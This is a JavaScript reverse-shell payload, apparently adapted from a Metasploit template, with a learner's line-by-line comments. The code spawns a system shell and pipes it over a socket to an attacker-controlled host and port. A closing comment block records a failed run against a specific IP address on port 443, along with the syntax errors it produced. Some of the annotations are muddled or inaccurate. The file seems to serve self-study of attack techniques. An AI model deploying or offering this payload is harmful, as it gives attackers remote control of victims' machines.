(function(){
  var require = global.require || global.process.mainModule.constructor._load;
  // It needs either a global variable or a global process main module
  if (!require) return;
  var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh";
  // Match a regex entry for windows applications? But it says /bin/sh which is a Linux directory
  // for Command Shells
  var net = require("#{net_lib}"),
  //Requires the javascript net library
      cp = require("child_process"),
      // requires a child process to target and migrate to
      util = require("util"),
      // requires some sort of utility package
      sh = cp.spawn(cmd, []);
      // Spawn a new process from line 5, compatible with platform, with a empty array?
  var client = this;
  // The victim's machine
  client.socket = net.connect(#{datastore['LPORT']}, "#{lhost}", #{tls_hash} function() {
    // Opens a connection from the victim, to specified LHOST and LPORT
    // use the TLS hash if specified
    client.socket.pipe(sh.stdin);
    // The function will redirect the socket stream to the attacker through the shells standard input
    util.pump(sh.stdout, client.socket);
    // pump, require, all needs node.js to be installed on victim's machine
    util.pump(sh.stderr, client.socket);
    // pump function is a node.js function that pipes all the streams TOGETHER
    // if one of the streams is terminated, then the shell dies
    // 3 streams
    // stdout
    // stderr
    // stdin
  });
})();
// You will need to provide to the shell, either directly by editing this or with some sort of external interface (another javascript program)
// or a Python to Javascript writer, the following variables client.socket is NOT needed, he is the some who clicked on it, he is the VICTIM
// 1. LHOST
// 2. LPORT
// 3. TLS (optional)

// attempts to run failed
// looks like node.js got patched.
// e_nodejs_reverse_shell.js
// js: "sample_nodejs_reverse_shell.js", line 18: illegal character
// js:   client.socket = net.connect(#{datastore['443']}, "54.183.166.71" function() {
// js: ..............................^
// js: "sample_nodejs_reverse_shell.js", line 18: missing ) after argument list
// js:   client.socket = net.connect(#{datastore['443']}, "54.183.166.71" function() {
// js: ...............................^
// js: "sample_nodejs_reverse_shell.js", line 21: syntax error
// js:     client.socket.pipe(sh.stdin);
// js: ...........^
// js: "sample_nodejs_reverse_shell.js", line 33: syntax error
// js: })();
// js: ^
// js: "sample_nodejs_reverse_shell.js", line 1: Compilation produced 4 syntax errors.
